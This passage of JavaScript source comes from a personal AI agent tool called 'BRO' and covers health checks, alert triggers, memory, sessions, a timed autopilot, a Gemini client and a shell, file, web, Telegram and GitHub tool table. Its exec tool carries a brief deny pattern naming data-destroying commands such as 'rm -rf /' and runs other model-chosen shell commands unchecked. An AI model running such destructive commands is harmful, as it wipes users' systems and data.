    try{var s=Date.now();var r=await fetch(ep.url,{headers:ep.headers,signal:AbortSignal.timeout(10000)});var ms=Date.now()-s;var ok=r.status<400;results.push({id:ep.id,name:ep.name,ok:ok,ms:ms,status:r.status,time:Date.now()});if(!silent)console.log("\r  "+(ok?p("green","\u2714"):p("red","\u2718"))+" "+p("cyan",ep.name.padEnd(15))+(ok?p("green","UP"):p("red","DOWN"))+" "+p("dim",ms+"ms"));}
    catch(e){results.push({id:ep.id,name:ep.name,ok:false,ms:-1,time:Date.now()});if(!silent)console.log("\r  "+p("red","\u2718")+" "+p("cyan",ep.name.padEnd(15))+p("red","TIMEOUT"));}
  }
  heartbeat.checks.push({time:Date.now(),results:results});
  if(heartbeat.checks.length>100)heartbeat.checks=heartbeat.checks.slice(-100);
  heartbeat.lastCheck=Date.now();
  results.forEach(function(r){if(!heartbeat.uptime[r.id])heartbeat.uptime[r.id]={total:0,up:0,avgMs:0,checks:0};var u=heartbeat.uptime[r.id];u.total++;u.checks++;if(r.ok){u.up++;u.avgMs=Math.round((u.avgMs*(u.checks-1)+r.ms)/u.checks);}});
  try{writeFileSync(HEARTBEAT_F,JSON.stringify(heartbeat),"utf8");}catch{}
  if(!silent){console.log("");Object.keys(heartbeat.uptime).forEach(function(id){var u=heartbeat.uptime[id];var pct=u.total>0?Math.round(u.up/u.total*100):0;var bar="\u2588".repeat(Math.floor(pct/10))+"\u2591".repeat(10-Math.floor(pct/10));console.log("  "+p("cyan",id.padEnd(10))+(pct>=90?p("green",""):pct>=70?p("yellow",""):p("red",""))+bar+RST+" "+pct+"%  "+p("dim","avg "+u.avgMs+"ms"));});console.log("");}
  return results;
}

var hbInterval=null;
function startHeartbeatDaemon(){hbInterval=setInterval(async function(){await runHeartbeat(true);await dreamCycle(true);},300000);}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DREAM ENGINE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var dreams;try{dreams=JSON.parse(readFileSync(DREAMS_F,"utf8"));}catch{dreams={entries:[]};}
function saveDreams(){try{writeFileSync(DREAMS_F,JSON.stringify(dreams,null,2),"utf8");}catch{}}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MEMORY
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var MEMORY_F=join(DATA_DIR,"memory.json");
var memory;try{memory=JSON.parse(readFileSync(MEMORY_F,"utf8"));}catch{memory={facts:[],observations:[],decisions:[],errors:[],total_interactions:0};}
function saveMemory(){try{writeFileSync(MEMORY_F,JSON.stringify(memory),"utf8");}catch{}}
function memorize(type,text,meta){
  var entry={text:String(text).substring(0,500),meta:meta||{},time:Date.now()};
  var bucket=type==="fact"?memory.facts:type==="decision"?memory.decisions:type==="error"?memory.errors:memory.observations;
  bucket.push(entry);
  if(bucket.length>500)bucket.splice(0,bucket.length-500);
  memory.total_interactions=(memory.total_interactions||0)+1;
  saveMemory();
}
function buildMemoryContext(){
  if(!memory.total_interactions)return"";
  var ctx="";
  if(memory.facts.length)ctx+="Known facts:\n"+memory.facts.slice(-5).map(function(f){return"- "+f.text;}).join("\n")+"\n";
  if(memory.observations.length)ctx+="Recent context:\n"+memory.observations.slice(-5).map(function(o){return"- "+o.text;}).join("\n")+"\n";
  return ctx;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SESSION PERSISTENCE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Each running instance (window/terminal) gets its OWN session file, keyed
// by pid+launch time - previously every instance shared a single
// last_session.json, so opening a second window would silently inherit
// (and then overwrite) whatever the first window was doing. Now every window
// starts with a fresh, empty chatLog; nothing carries over automatically.
// The persistent 'memory' system (facts/observations, above) is intentionally
// still shared across all instances - that's long-term recall, not a raw
// transcript, and sharing it is the desired behavior.
var SESSIONS_DIR=join(DATA_DIR,"sessions");
try{mkdirSync(SESSIONS_DIR,{recursive:true});}catch{}
var SESSION_F=join(SESSIONS_DIR,process.pid+"-"+Date.now()+".json");
var lastSessionInfo=null; // info about the most recent OTHER window's session, for /brotime
function saveSession(log){
  try{writeFileSync(SESSION_F,JSON.stringify({endedAt:Date.now(),pid:process.pid,turns:log.slice(-40)}),"utf8");}catch{}
}
function findMostRecentOtherSession(){
  try{
    var files=readdirSync(SESSIONS_DIR).filter(function(f){return f.endsWith(".json")&&join(SESSIONS_DIR,f)!==SESSION_F;});
    var withTimes=files.map(function(f){try{return {f:f,mtime:statSync(join(SESSIONS_DIR,f)).mtimeMs};}catch{return null;}}).filter(Boolean);
    if(!withTimes.length)return null;
    withTimes.sort(function(a,b){return b.mtime-a.mtime;});
    var raw=JSON.parse(readFileSync(join(SESSIONS_DIR,withTimes[0].f),"utf8"));
    return {endedAt:raw.endedAt,turnCount:(raw.turns||[]).length};
  }catch{return null;}
}
function pruneOldSessions(keep){
  try{
    var files=readdirSync(SESSIONS_DIR).filter(function(f){return f.endsWith(".json");});
    if(files.length<=keep)return;
    var withTimes=files.map(function(f){try{return {f:f,mtime:statSync(join(SESSIONS_DIR,f)).mtimeMs};}catch{return null;}}).filter(Boolean);
    withTimes.sort(function(a,b){return b.mtime-a.mtime;});
    withTimes.slice(keep).forEach(function(x){try{unlinkSync(join(SESSIONS_DIR,x.f));}catch{}});
  }catch{}
}
lastSessionInfo=findMostRecentOtherSession();
pruneOldSessions(20);
function timeAgo(ms){
  var s=Math.max(0,Math.floor((Date.now()-ms)/1000));
  if(s<60)return s+"s ago";
  if(s<3600)return Math.floor(s/60)+"m ago";
  if(s<86400)return Math.floor(s/3600)+"h ago";
  return Math.floor(s/86400)+"d ago";
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AUTOPILOT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var AUTOPILOT_F=join(DATA_DIR,"autopilot.json");
var autopilot;
try{
  var apRaw=JSON.parse(readFileSync(AUTOPILOT_F,"utf8"));
  // Tolerate the plain-array format written by autoBroPatternWizard as well as {queue:[...]}
  autopilot=Array.isArray(apRaw)?{queue:apRaw}:apRaw;
}catch{autopilot={queue:[]};}
if(!autopilot.queue)autopilot.queue=[];
autopilot.queue.forEach(function(t){if(!t.status)t.status=t.enabled===false?"disabled":"pending";if(!t.type)t.type="scheduled";});
function saveAutopilot(){try{writeFileSync(AUTOPILOT_F,JSON.stringify(autopilot,null,2),"utf8");}catch{}}
function addTask(name,cmd,freq){
  autopilot.queue.push({id:Date.now()+"_"+Math.random().toString(36).slice(2,7),name:name,cmd:cmd,type:"manual",freq:freq||"10m",status:"pending",enabled:true,created:Date.now(),runs:0});
  saveAutopilot();
}
var autopilotTimer=null;
function freqToMs(freq){var m=/^(\d+)\s*(m|h|s)?$/i.exec(String(freq||"10m").trim());if(!m)return 600000;var n=parseInt(m[1]);var unit=(m[2]||"m").toLowerCase();return unit==="s"?n*1000:unit==="h"?n*3600000:n*60000;}
function runAutopilotTick(){
  var now=Date.now();
  autopilot.queue.forEach(function(t){
    if(t.enabled===false||t.status==="running")return;
    if(t.lastRun&&now-t.lastRun<freqToMs(t.freq))return;
    t.status="running";
    try{t.lastResult=TOOLS.exec(t.cmd).substring(0,500);}
    catch(e){t.lastResult="ERR: "+e.message;}
    t.runs=(t.runs||0)+1;
    t.lastRun=Date.now();
    t.status="pending";
  });
  saveAutopilot();
}
function startAutopilot(){if(autopilotTimer)return;autopilotTimer=setInterval(runAutopilotTick,60000);}
function stopAutopilot(){if(autopilotTimer){clearInterval(autopilotTimer);autopilotTimer=null;}}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SESSION TIME STATE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var broTimeState={sessionStart:Date.now(),sessionCmds:0};

var DREAM_TRIGGERS={
  api_failure:{condition:function(){var recent=heartbeat.checks.slice(-5);var f=0;recent.forEach(function(c){c.results.forEach(function(r){if(!r.ok)f++;});});return f>=3;},type:"nightmare",icon:"\u{1F525}",generate:function(){var failing=[];var recent=heartbeat.checks.slice(-1)[0];if(recent)recent.results.forEach(function(r){if(!r.ok)failing.push(r.name);});return{title:"API Instability",insight:"Failures on: "+failing.join(", ")+". External deps unreliable.",severity:"high",actions:[{label:"Full health check",cmd:"/k1 bench"},{label:"Start rotator backup",cmd:"/k1 rotator"}]};}},
  high_errors:{condition:function(){return stats.errors>0&&stats.errors/Math.max(1,stats.totalCmds)>0.2;},type:"warning",icon:"\u26A0\uFE0F",generate:function(){return{title:"High Error Rate",insight:"Error rate "+Math.round(stats.errors/Math.max(1,stats.totalCmds)*100)+"%. Check paths and tokens.",severity:"medium",actions:[{label:"View errors",cmd:"/log"},{label:"System status",cmd:"/status"}]};}},
  repetitive:{condition:function(){var top=Object.entries(stats.cmdFreq).sort(function(a,b){return b[1]-a[1];});return top.length>0&&top[0][1]>20;},type:"insight",icon:"\u{1F4A1}",generate:function(){var top=Object.entries(stats.cmdFreq).sort(function(a,b){return b[1]-a[1];}).slice(0,3);return{title:"Repetitive Pattern",insight:"Top: "+top.map(function(t){return t[0]+" ("+t[1]+"x)";}).join(", ")+". Automate these.",severity:"low",actions:[{label:"View history",cmd:"history"},{label:"Create macro",cmd:"create a script for my common tasks"}]};}},
  token_expiry:{condition:function(){try{var payload=JSON.parse(Buffer.from(TOKEN.split(".")[1],"base64").toString());return payload.exp*1000-Date.now()<604800000;}catch{return false;}},type:"warning",icon:"\u23F0",generate:function(){try{var payload=JSON.parse(Buffer.from(TOKEN.split(".")[1],"base64").toString());var days=Math.floor((payload.exp*1000-Date.now())/86400000);return{title:"Token Expiring",insight:"Base44 token expires in "+days+" days.",severity:days<3?"high":"medium",actions:[{label:"Check tokens",cmd:"/tokens"},{label:"Refresh",cmd:"!start https://base44.app"}]};}catch{return{title:"Token Error",insight:"Parse failed",severity:"medium",actions:[]};}}},
  chain_health:{condition:function(){return Math.random()<0.15;},type:"dream",icon:"\u26D3\uFE0F",generate:function(){return{title:"Chain Meditation",insight:"The build chain grows through work, not words.",severity:"low",actions:[{label:"Check chain",cmd:"/chain"},{label:"View project DNA",cmd:"/brofile"}]};}},
  skill_decay:{condition:function(){return skills.filter(function(s){return s.enabled&&s.level<2;}).length>=3;},type:"warning",icon:"\u{1F4C9}",generate:function(){var weak=skills.filter(function(s){return s.enabled&&s.level<2;}).map(function(s){return s.name;});return{title:"Skill Atrophy",insight:"Low: "+weak.join(", ")+". Competence decays without exercise.",severity:"medium",actions:[{label:"Skills dashboard",cmd:"/skills"},{label:"Practice",cmd:"run a security scan"}]};}},
  creative:{condition:function(){return Math.random()<0.1;},type:"dream",icon:"\u2728",generate:function(){var sparks=[{t:"Agent Swarm",i:"Four agents. One researches, one codes, one reviews, one deploys."},{t:"Zero Budget Empire",i:"Every tool is free tier. The constraint is the filter."},{t:"Governance by Code",i:"What if the Three Vows were assertions, not words?"},{t:"The Spiral Grows",i:"Each session adds weight. The identity is earned."},{t:"Architecture Vision",i:"Every file with a provenance hash. Filesystem as ledger."}];var s=sparks[Math.floor(Math.random()*sparks.length)];return{title:s.t,insight:s.i,severity:"low",actions:[{label:"Explore",cmd:"expand on: "+s.t},{label:"Build it",cmd:"prototype: "+s.t}]};}}
};

async function dreamCycle(silent){
  var triggered=[];
  Object.keys(DREAM_TRIGGERS).forEach(function(key){var tr=DREAM_TRIGGERS[key];try{if(tr.condition()){var d=tr.generate();d.id=createHash("md5").update(key+Date.now()).digest("hex").substring(0,8);d.type=tr.type;d.icon=tr.icon;d.trigger=key;d.time=Date.now();d.resolved=false;triggered.push(d);}}catch{}});
  var recent=dreams.entries.filter(function(d){return Date.now()-d.time<3600000;}).map(function(d){return d.trigger;});
  triggered=triggered.filter(function(d){return!recent.includes(d.trigger);});
  triggered.forEach(function(d){
    dreams.entries.push(d);
      if(d.type==="nightmare") tgNotify("\u{1F525} " + d.title + ": " + d.insight.substring(0, 200));
    if(!silent){
      var tc=d.type==="nightmare"?p("red",""):d.type==="warning"?p("yellow",""):d.type==="insight"?p("cyan",""):p("magenta","");
      console.log("\n  "+d.icon+" "+tc+BOLD+d.title+RST);
      console.log("  "+p("dim",d.insight));
      if(d.actions)d.actions.forEach(function(a,i){console.log("    "+p("cyan","["+(i+1)+"]")+" "+a.label+" "+p("dim","-> "+a.cmd));});
      console.log("");
    }
  });
  if(dreams.entries.length>200)dreams.entries=dreams.entries.slice(-200);
  saveDreams();return triggered;
}

function showDreamTree(){
  var G=rgb(255,215,0);var P=rgb(180,0,255);var R=RST;var B=BOLD;
  console.log("\n"+P+B+"  \u{1F319} BRO DREAM ENGINE"+R+"\n");
  if(dreams.entries.length===0){console.log("  "+p("dim","No dreams yet. BRO dreams during idle heartbeats.\n"));return;}
  var groups={nightmare:[],warning:[],insight:[],dream:[]};
  dreams.entries.slice(-30).forEach(function(d){if(groups[d.type])groups[d.type].push(d);});
  var icons={nightmare:p("red","\u2588 NIGHTMARES"),warning:p("yellow","\u2588 WARNINGS"),insight:p("cyan","\u2588 INSIGHTS"),dream:p("magenta","\u2588 DREAMS")};
  Object.keys(groups).forEach(function(type){
    var list=groups[type];if(!list.length)return;
    console.log("  "+icons[type]+p("dim"," ("+list.length+")")+R);
    list.slice(-5).forEach(function(d,i){
      var age=Math.floor((Date.now()-d.time)/60000);var ageStr=age<60?age+"m":Math.floor(age/60)+"h";
      var resolved=d.resolved?p("green"," \u2714"):p("dim"," \u25CB");
      console.log("  "+p("dim","  "+(i===list.length-1?"\u2514":"\u251C")+"\u2500\u2500")+" "+d.icon+" "+p("cyan",d.title)+resolved+p("dim"," ("+ageStr+")"));
      if(d.actions)d.actions.forEach(function(a,j){console.log("  "+p("dim","  "+(i===list.length-1?" ":"\u2502")+"   "+(j===d.actions.length-1?"\u2514":"\u251C")+"\u2500 ")+p("green",a.label)+p("dim"," -> "+a.cmd));});
    });console.log("");
  });
  var total=dreams.entries.length;var unres=dreams.entries.filter(function(d){return!d.resolved;}).length;
  console.log("  "+G+"Total: "+total+" | Unresolved: "+unres+R);
  console.log("  "+p("dim","Resolve: /dream resolve ID | Force: /dream now | Clear: /dream clear\n"));
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// API + TOOLS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// VERTEX TOKEN (auto-refresh via gcloud on 401)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
var cachedVertexToken = process.env.VERTEX_OAUTH_TOKEN || "";
function refreshVertexToken(){
  try{
    var out = execSync("gcloud auth print-access-token", {encoding:"utf8", timeout:15000}).trim();
    if(out){ cachedVertexToken = out; return out; }
  }catch(e){
    console.log(p("red","  Failed to refresh gcloud token: "+e.message.split("\n")[0]));
  }
  return "";
}

var cachedGcpProjectId = process.env.GCP_PROJECT_ID || "";
function detectGcpProjectId(){
  try{
    var out = execSync("gcloud config get-value project", {encoding:"utf8", timeout:15000}).trim();
    if(out && out !== "(unset)"){ cachedGcpProjectId = out; return out; }
  }catch(e){ /* gcloud not installed or not configured - caller reports missing credentials */ }
  return "";
}

async function askChat(chatHistory, ret, abortSignal){
  ret=ret||3;
  stats.apiCalls++;

  if (!cachedVertexToken) refreshVertexToken(); // never set via env - try gcloud once
  if (!cachedGcpProjectId) detectGcpProjectId(); // ditto for the project id

  var PROJECT_ID = cachedGcpProjectId;
  var REGION = process.env.GCP_REGION || "us-central1";
  var MODEL = process.env.GCP_MODEL || "gemini-2.5-flash"; 

  if (!cachedVertexToken || !PROJECT_ID) {
    throw new Error("Missing local credentials. Run 'gcloud auth login' and 'gcloud config set project YOUR_PROJECT_ID' once, then BRO will pick both up automatically from here on.");
  }

  var url = `https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT_ID}/locations/${REGION}/publishers/google/models/${MODEL}:generateContent`;

  for(var i=0;i<ret;i++){
    try{
      var s=Date.now();
      var timeoutSignal = AbortSignal.timeout(120000);
      var r=await fetch(url,{
        method:"POST",
        headers:{
          "Content-Type":"application/json",
          "Authorization":"Bearer " + cachedVertexToken
        },
        body:JSON.stringify({
          contents: chatHistory, // Send the structural chat history
          systemInstruction: {
            parts: [{ text: buildSys() }]
          }
        }),
        signal: abortSignal ? AbortSignal.any([abortSignal, timeoutSignal]) : timeoutSignal
      });
      
      var el=((Date.now()-s)/1000).toFixed(1);
      if(!r.ok){
        if(r.status===401){
          var fresh = refreshVertexToken();
          if(fresh){ continue; } // retry immediately with the new token, doesn't count against sleep-based retries below
        }
        if(r.status===429||r.status>=500){
          await sleep((i+1)*3000);
          continue;
        }
        var errBody = "";
        try { errBody = " - " + await r.text(); } catch(_) {}
        throw new Error("Vertex API rejected payload: " + r.status + errBody);
      }
      
      var d=await r.json();
      var responseText = "";
      var tokens = 0;
      
      if (d.candidates && d.candidates[0] && d.candidates[0].content && d.candidates[0].content.parts[0]) {
        responseText = d.candidates[0].content.parts[0].text;
      }
      if (d.usageMetadata) {
        tokens = d.usageMetadata.candidatesTokenCount || 0;
      }
      
      stats.totalTokens+=tokens;
      saveStat();
      
      return {
        content: responseText,
        elapsed: el,
        tokens: tokens
      };
    }catch(e){
      if(abortSignal && abortSignal.aborted){
        var stopErr = new Error("Stopped by user");
        stopErr.userStopped = true;
        throw stopErr; // never retry a user-initiated stop
      }
      if(i===ret-1){
        stats.errors++;
        saveStat();
        throw e;
      }
      await sleep((i+1)*2000);
    }
  }
  throw new Error("Failed");
}
function syncSleep(ms){ try{ Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms); }catch(e){} }
function isTransientFsError(e){ return !!(e && (e.code==="EBUSY"||e.code==="EPERM"||e.code==="EACCES"||e.code==="ETXTBSY")); }
function withFsRetry(fn, attempts){
  attempts = attempts || 3;
  for(var i=0;i<attempts;i++){
    try{ return fn(); }
    catch(e){
      if(!isTransientFsError(e) || i===attempts-1) throw e;
      syncSleep(150*(i+1)); // back off a bit more each retry
    }
  }
}
var TOOLS={
  exec:function(a){var cmd=a.trim();if(!cmd)return"ERROR: empty";if(/^(rm\s+-rf\s+\/|format\s+[a-z]:|shutdown)/i.test(cmd))return"BLOCKED";try{var opts={encoding:"utf8",timeout:60000,cwd:process.cwd(),maxBuffer:5242880};if(process.platform==="win32")opts.shell="powershell.exe";return execSync(cmd,opts).trim().substring(0,MAX_OUT)||"(ok)";}catch(e){stats.errors++;return"ERR "+(e.status||"?")+": "+((e.stderr||"")+(e.stdout||"")||e.message).substring(0,MAX_OUT);}},
  read:function(a){var pa=resolve(a.trim());if(!existsSync(pa))return"NOT FOUND: "+pa;var s=statSync(pa);if(s.isDirectory())return TOOLS.list(a);if(s.size>500000)return"TOO LARGE";if([".png",".jpg",".gif",".mp4",".zip",".exe",".dll",".pdf"].includes(extname(pa)))return"BINARY: "+basename(pa);return readFileSync(pa,"utf8").substring(0,MAX_OUT);},
write:function(a){
  var parts=a.split(/\r?\n|\\n/);
  if(parts.length<2)return "ERR";
  var pa=resolve(parts[0].trim());
  try{
    mkdirSync(dirname(pa),{recursive:true});
    withFsRetry(function(){ writeFileSync(pa,parts.slice(1).join("\n"),"utf8"); });
    return "OK -> "+pa;
  } catch(e){
    return "ERR: "+e.message;
  }
},
  list:function(a){var pa=resolve(a.trim()||".");if(!existsSync(pa))return"NOT FOUND";try{var it=readdirSync(pa);return pa+" ("+it.length+")\n"+it.map(function(f){try{var s=statSync(join(pa,f));return(s.isDirectory()?"D ":"  ")+f+(s.isFile()?" "+s.size+"b":"");}catch{return"  "+f;}}).join("\n");}catch(e){return"ERR: "+e.message;}},
  append:function(a){var parts=a.split(/\r?\n|\\n/);if(parts.length<2)return"ERR: expected PATH followed by a newline and CONTENT";try{withFsRetry(function(){appendFileSync(resolve(parts[0].trim()),parts.slice(1).join("\n"),"utf8");});return"OK";}catch(e){return"ERR: "+e.message;}},
  mkdir:function(a){try{mkdirSync(resolve(a.trim()),{recursive:true});return"OK";}catch(e){return"ERR: "+e.message;}},
  cp:function(a){var p2=a.trim().split(/\s+to\s+|\s+->\s+|\s+/);try{withFsRetry(function(){copyFileSync(resolve(p2[0]),resolve(p2[1]));});return"OK";}catch(e){return"ERR: "+e.message;}},
  mv:function(a){var p2=a.trim().split(/\s+to\s+|\s+->\s+|\s+/);try{withFsRetry(function(){renameSync(resolve(p2[0]),resolve(p2[1]));});return"OK";}catch(e){return"ERR: "+e.message;}},
  rm:function(a){try{withFsRetry(function(){unlinkSync(resolve(a.trim()));});return"OK";}catch(e){return"ERR: "+e.message;}},
  find:function(a){var p2=a.trim().split(/\s+/);var dir=resolve(p2[0]||".");var re=new RegExp(p2[1]||".","i");var res=[];function w(d,dep){if(dep>5||res.length>100)return;try{readdirSync(d).forEach(function(f){if(f==="node_modules"||f===".git")return;var full=join(d,f);if(re.test(f))res.push(full);try{if(statSync(full).isDirectory())w(full,dep+1);}catch{}});}catch{}}w(dir,0);return res.join("\n")||"None";},
grep:function(a){
    var m=a.trim().match(/^(\S+)\s+in\s+(.+)$/)||a.trim().match(/^(\S+)\s+(.+)$/);
    if(!m)return"ERR";
    var re;
    try { re = new RegExp(m[1],"ig"); } catch(e) { return "ERR: Invalid Regex"; }
    var dir=resolve(m[2]);
    var res=[];
    function s(d,dep){
      if(dep>10||res.length>200)return;
      try{
        readdirSync(d).forEach(function(f){
          if(f==="node_modules"||f===".git")return;
          var full=join(d,f);
          try{
            var st=statSync(full);
            if(st.isDirectory())s(full,dep+1);
            else if(st.isFile()&&st.size<2000000){
              readFileSync(full,"utf8").split("\n").forEach(function(l,i){
                if(re.test(l))res.push(full+":"+(i+1)+": "+l.trim().substring(0,200));
              });
            }
          }catch{}
        });
      }catch{}
    }
    s(dir,0);
    return res.join("\n").substring(0,MAX_OUT)||"None";
  },
patch:function(a){
    var lines=a.trim().split(/\r?\n|\\n/);
    if(lines.length<3)return"ERR: Needs Path, Search, and Replace content";
    var pa=resolve(lines[0]);
    if(!existsSync(pa))return"NOT FOUND";
    try{
      var raw=readFileSync(pa,"utf8");
      var usesCRLF = raw.includes("\r\n");
      var c = raw.replace(/\r\n/g,"\n"); // normalize for matching, regardless of the file's actual line-ending style
      var search = lines[1].replace(/\r\n/g,"\n");
      if(!c.includes(search))return"NOT FOUND: Search pattern not found";
      var replaced = c.replace(search, lines.slice(2).join("\n"));
      if(usesCRLF) replaced = replaced.replace(/\n/g,"\r\n"); // write back in whatever style the file originally used
      withFsRetry(function(){ writeFileSync(pa,replaced,"utf8"); });
      return"PATCHED";
    }catch(e){return"ERR: "+e.message;}
  },
  web:async function(a){
    var query = a.trim();
    if(!query) return "ERROR: empty query";
    try {
      // Direct call to a free, zero-auth HTML search API (html.duckduckgo.com or similar ddg lite endpoint)
      var url = "https://html.duckduckgo.com/html/?q=" + encodeURIComponent(query);
      var response = await fetch(url, {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
      });
      if(!response.ok) return "ERR: Search response " + response.status;
      var html = await response.text();
      // Extract links and snippets from DuckDuckGo HTML structure
      var matches = [];
      var re = /<a class="result__snippet"[^>]*href="([^"]*)"[^>]*>([\s\S]*?)<\/a>/g;
      var m;
      while ((m = re.exec(html)) !== null && matches.length < 5) {
        var snippet = m[2].replace(/<[^>]*>/g, "").trim();
        var rawUrl = m[1];
        var decodedUrl = decodeURIComponent(rawUrl.split("uddg=")[1] || rawUrl).split("&")[0];
        matches.push(`Source: ${decodedUrl}\nSnippet: ${snippet}\n`);
      }
      return matches.join("\n---\n") || "No results found.";
    } catch(e) {
      return "ERR: " + e.message;
    }
  },
  broadcast:async function(a){
    var text=a.trim();
    if(!text) return "ERR: empty message";
    if(!tgConfig.botToken) return "ERR: Telegram isn't configured (no bot token). Set it up with /tg first.";
    var approved=Object.values(tgGroups).filter(function(g){return g.approved;});
    if(!approved.length) return "ERR: No approved Telegram groups yet. Discovered groups need /tg approve ID before BRO can broadcast to them. See /tg groups for the list.";
    var res=await tgBroadcast(text);
    var out="Broadcast sent to "+res.sent.length+"/"+approved.length+" approved group(s)"+(res.sent.length?": "+res.sent.join(", "):"")+".";
    if(res.failed.length) out+=" Failed: "+res.failed.join(", ")+".";
    return out;
  },
  tg_groups:function(){
    var gl=Object.values(tgGroups);
    if(!gl.length) return "No Telegram groups discovered yet.";
    return gl.map(function(g){return (g.approved?"[approved] ":"[pending]  ")+g.title+"  id:"+g.id+"  type:"+g.type;}).join("\n");
  },
  tg_approve:function(a){
    var q=a.trim();
    if(!q) return "ERR: specify a group id or (part of) its title";
    var match=tgGroups[q] || Object.values(tgGroups).find(function(g){return g.title.toLowerCase().includes(q.toLowerCase());});
    if(!match) return "ERR: no known group matches \""+q+"\". Use tg_groups to list known groups.";
    match.approved=true; saveTgGroups();
    return "Approved \""+match.title+"\" (id "+match.id+") for broadcasting.";
  },
  tg_unapprove:function(a){
    var q=a.trim();
    if(!q) return "ERR: specify a group id or (part of) its title";
    var match=tgGroups[q] || Object.values(tgGroups).find(function(g){return g.title.toLowerCase().includes(q.toLowerCase());});
    if(!match) return "ERR: no known group matches \""+q+"\". Use tg_groups to list known groups.";
    match.approved=false; saveTgGroups();
    return "Unapproved \""+match.title+"\" (id "+match.id+").";
  },
  github:async function(a){
    var parts=a.trim().split(" ");
    var action=(parts[0]||"").toLowerCase();
    var rest=parts.slice(1).join(" ").trim();
    try{
      if(action==="repo"){var d=await ghRepoInfo(rest);return JSON.stringify(d);}
      if(action==="prs"){var pr=await ghPRs(rest);return pr.length?pr.map(function(x){return "#"+x.number+" "+x.title+" ("+x.state+(x.draft?", draft":"")+") by "+x.user;}).join("\n"):"No open PRs.";}
      if(action==="issues"){var is=await ghIssues(rest);return is.length?is.map(function(x){return "#"+x.number+" "+x.title+" by "+x.user;}).join("\n"):"No open issues.";}
      if(action==="checks"){var ck=await ghChecks(rest);return ck.length?ck.map(function(x){return x.name+": "+(x.conclusion||x.status);}).join("\n"):"No check runs found.";}
      if(action==="file"){var fp=rest.split(" ");return await ghFile(fp[0], fp.slice(1).join(" "));}
      return "ERR: unknown github action \""+action+"\". Use one of: repo, prs, issues, checks, file OWNER/REPO PATH";
    }catch(e){ return "ERR: "+e.message; }
  }
};

// Wire up the agentic web browsing engine (bro-web.mjs)
Object.assign(TOOLS, WEB_TOOLS);

function extractT(t){var re=/<<<TOOL:(\w+)\s([\s\S]*?)>>>/g;var c=[];var m;while((m=re.exec(t))!==null)c.push({tool:m[1].toLowerCase(),args:m[2]});return c;}
async function runT(c){
  var results = [];
  for(var x of c) {
    var fn = TOOLS[x.tool];
    if(!fn) {
      results.push({tool:x.tool,args:x.args,result:"UNKNOWN",ms:0});
      continue;
    }
    var s = Date.now();
    stats.toolCalls++;
    var res = fn(x.args);
    if(res instanceof Promise) {
      res = await res;
    }
    results.push({tool:x.tool,args:x.args,result:res,ms:Date.now()-s});
  }
  return results;
}
function cln(t){return t.replace(/<<<TOOL:\w+\s[\s\S]*?>>>/g,"").trim();}

